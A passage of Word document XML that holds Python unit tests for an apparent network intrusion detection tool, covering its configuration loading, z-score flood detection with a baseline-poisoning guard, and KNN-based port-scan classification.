          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="061051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test_privacy_defaults_match_nfr3(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0B86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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44302DA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self.assertTrue(c.privacy_mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075452C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self.assertEqual(c.payload_excerpt_bytes, 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F7B651" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="621A13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test_loopback_is_whitelisted_by_default(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5B7F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self.assertIn("127.0.0.1", Config().block_whitelist)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A36132E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="678ABD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test_env_overrides_defaults_with_type_coercion(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A139F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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543AA62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c.load_env({"MANTIS_BLOCK_ENABLED": "true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6905210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"MANTIS_ZSCORE_THRESHOLD": "4.5",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D1C55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"MANTIS_ZSCORE_WINDOW": "60",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8D723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"MANTIS_BLOCK_ON": "ddos,scan"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1363F51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self.assertIs(c.block_enabled, True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBD20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self.assertEqual(c.zscore_threshold, 4.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E86907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self.assertEqual(c.zscore_window, 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B61167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self.assertEqual(c.block_on, ["ddos", "scan"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A6FEF0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F8F09C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test_json_file_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D76701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tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B795C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54FA92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path = os.path.join(tmp, "c.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDB6DF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import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1778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open(path, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6CF3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json.dump({"zscore_threshold": 2.5, "http_port": 9090}, f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD7ED8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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBF05C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self.assertTrue(c.load_file(path))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4D07D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self.assertEqual(c.zscore_threshold, 2.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C33BD6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self.assertEqual(c.http_port, 9090)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F68FC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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F5CFC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shutil.rmtree(tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2931F2DF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C3F11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test_bad_env_value_does_not_crash(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A80063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 = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7B11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c.load_env({"MANTIS_ZSCORE_WINDOW": "not-a-number"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585BF5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self.assertEqual(c.zscore_window, 30)  # default retained</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADBB113" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3924FB2C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AC495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class TestZScoreCorrections(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AB63B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"""Regression tests for the flood-recall defect."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441D8DF1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CDB394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BASELINE = [10, 12, 11, 10, 13, 9, 11, 12, 10, 11]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41324E9C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41FE986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test_welford_matches_two_pass_variance(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2895A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 = z_score.MinimalistStats(window_size=100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330329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v in self.BASELINE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B524B7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e.update(v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F25546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mean, std = e.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1623637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ref_mean = sum(self.BASELINE) / len(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AB654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ref_std = math.sqrt(sum((x - ref_mean) ** 2 for x in self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5858621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len(self.BASELINE))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B76F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self.assertAlmostEqual(mean, ref_mean, places=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05408A9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self.assertAlmostEqual(std, ref_std, places=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18106B37" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48EDD9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test_welford_is_stable_on_large_magnitudes(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C19A6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the naive sum-of-squares form loses precision here; Welford must not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094D10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 = z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7AEE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v in (1e8, 1e8 + 1, 1e8 + 2, 1e8 + 3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432134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e.update(v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDDBFF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_, std = e.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351AE66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self.assertAlmostEqual(std, math.sqrt(1.25), places=6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64053483" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36BC69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test_sustained_flood_is_detected_throughout(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7529DF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the poisoning guard must keep alerting for the whole attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626387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 = z_score.MinimalistStats(window_size=10, threshold=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F51542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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E150C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detections = sum(1 for _ in range(60) if e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58865E3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self.assertEqual(detections, 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D90ED7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631B240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test_naive_baseline_absorbs_the_flood(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2342C75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documents the defect the guard fixes: without it recall collapses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E5119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 = z_score.MinimalistStats(window_size=10, threshold=3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DFC8C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guard_baseline=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45268A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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728C10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detections = sum(1 for _ in range(60) if e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027186D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self.assertLess(detections, 5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584F0254" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A1946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test_normal_traffic_raises_no_alert(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669F7E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 = z_score.MinimalistStats(window_size=10, threshold=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB2174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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E33BE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v in [10, 11, 12, 10, 9, 11, 13, 10]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62251D6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self.assertFalse(e.analyse(v).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E5B602" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B8450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test_low_volume_spike_is_not_mislabeled_as_ddos(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0D6BE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 = z_score.MinimalistStats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F1CA7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window_size=10, threshold=3.0, min_pps=500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF05A7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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CB8C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 = e.analyse(75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D5367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self.assertGreater(verdict.detail["z_score"], 3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159722D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self.assertTrue(verdict.detail["statistical_anomaly"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621F46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self.assertFalse(verdict.detail["volume_candidate"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D30FA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self.assertFalse(verdict.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100D1A9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self.assertEqual(e.history[-1], 75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C1FC47" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F81F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test_live_sensor_requires_sustained_high_volume_spike(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDAD7E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 = z_score.MinimalistStats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9915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window_size=10, threshold=3.0, min_pps=500,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D126C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required_consecutive=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC92A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e.train(self.BASELINE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1969E5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self.assertFalse(e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA5C5C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self.assertFalse(e.analyse(8000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A05A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third = e.analyse(8000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAD5AE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self.assertTrue(third.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378455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self.assertTrue(third.detail["new_threat"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADEB6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fourth = e.analyse(8000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1ACD6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self.assertTrue(fourth.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08469F0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self.assertFalse(fourth.detail["new_threat"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18502C82" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56C843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test_no_alert_before_warm_up(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE3C1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 cold engine must not fire on its first observations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B825D5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 = z_score.MinimalistStats(window_size=30, threshold=3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6344457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self.assertFalse(e.analyse(50000).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D291B01" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CFDC11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test_single_outlier_z_ceiling(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE667E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 = z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2BDD4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v in self.BASELINE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD4019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e.update(v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4D1A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self.assertAlmostEqual(e.max_detectable_z, 9 / math.sqrt(10), places=6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05043FA1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F09B77E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02D1128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TestKNNFeatureScaling(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BF750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"""Regression tests for the flood-misclassified-as-scan defect."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F9F7D9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00A609F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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD8085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self.e = knn.KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C3D3E3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21A45C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test_flood_is_not_reported_as_a_port_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3990589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pps in (1500, 4000, 8000, 15000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A343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 _ = self.e.classify(1, pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F72390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self.assertEqual(verdict, "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C02E9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 port @ %d pps misread as a scan" % pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B1CA4B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DAA6DB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test_zero_ports_can_never_be_a_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3F26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Regression: an imported CIC-derived brain once labeled this Scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ADFDC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self.e.train([[0, 50, "Scan"], [0, 100, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18ED2A3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[100, 120, "Scan"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7923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self.assertEqual(self.e.training_data[0][2], "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B567C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 = self.e.analyse(0, 75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF6A3E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self.assertEqual(verdict.label, "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FB39E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self.assertFalse(verdict.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E909FD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22311C2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test_low_port_ratio_is_not_a_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5111FDE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High packet volume over a few ports is browsing or a flood, not a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A474D4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horizontal port scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6D8BD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self.e.train([[100, 6000, "Scan"], [50, 3000, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719B980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 50, "Normal"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7923BF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self.assertEqual(self.e.classify(25, 1000)[0], "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B774B13" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A87F8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test_scan_still_detected(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D490CA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ports, pps in ((45, 50), (200, 200), (400, 800)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667713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 _ = self.e.classify(ports, pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0134BFA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self.assertEqual(verdict, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA8C6C0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68DD9B3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test_normal_browsing_still_normal(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1898DF7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realistic client profiles: many packets spread over few ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC147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ports, pps in ((1, 5), (2, 12), (12, 75), (25, 150), (27, 160)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EA45B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self.assertEqual(self.e.classify(ports, pps)[0], "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3681B42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 ports / %d pkts misread as a scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E936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(ports, pps))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D23041" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B91F7A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test_low_volume_stealth_scan_is_detected(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D63A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 deliberately slow scan stays below any volumetric threshold, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7FC40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only the ports/packets ratio can catch it: 20 ports in 30 packets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728FE61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cannot be 20 completed TCP conversations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157A8D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ports, pps in ((20, 30), (12, 18), (30, 40)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1994E62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self.assertEqual(self.e.classify(ports, pps)[0], "Scan",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004DA1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"stealth scan %d ports / %d pkts missed"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4C0F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(ports, pps))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EDED0A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27AB5E6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test_ratio_feature_separates_the_classes(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7451004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the engineered third feature is what makes the boundary separable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6284E8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ranges = self.e.feature_ranges()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCC09B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self.assertEqual(len(ranges), 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719CDB7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self.assertEqual(self.e._features(30, 40)[2], 0.75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299C29F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self.assertEqual(self.e._features(1, 1000)[2], 0.001)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6703ACF1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="130E98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test_features_are_normalised_to_unit_range(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F0F58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low, high = self.e.feature_ranges()[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040712B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self.assertEqual(self.e._scale([low, 0, 0])[0], 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E65701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self.assertEqual(self.e._scale([high, 0, 0])[0], 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348AD184" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C948BA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test_scaling_recomputed_after_training(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BE18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before = self.e.feature_ranges()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCC29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self.e.train([[5, 20, "Normal"], [900, 3000, "Scan"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6E75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self.assertNotEqual(before, self.e.feature_ranges())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9019CE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="023AAAC3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FB5B3C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TestKMeansNovelty(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BF01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"""Regression tests for the engine that previously never fired."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AF807D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
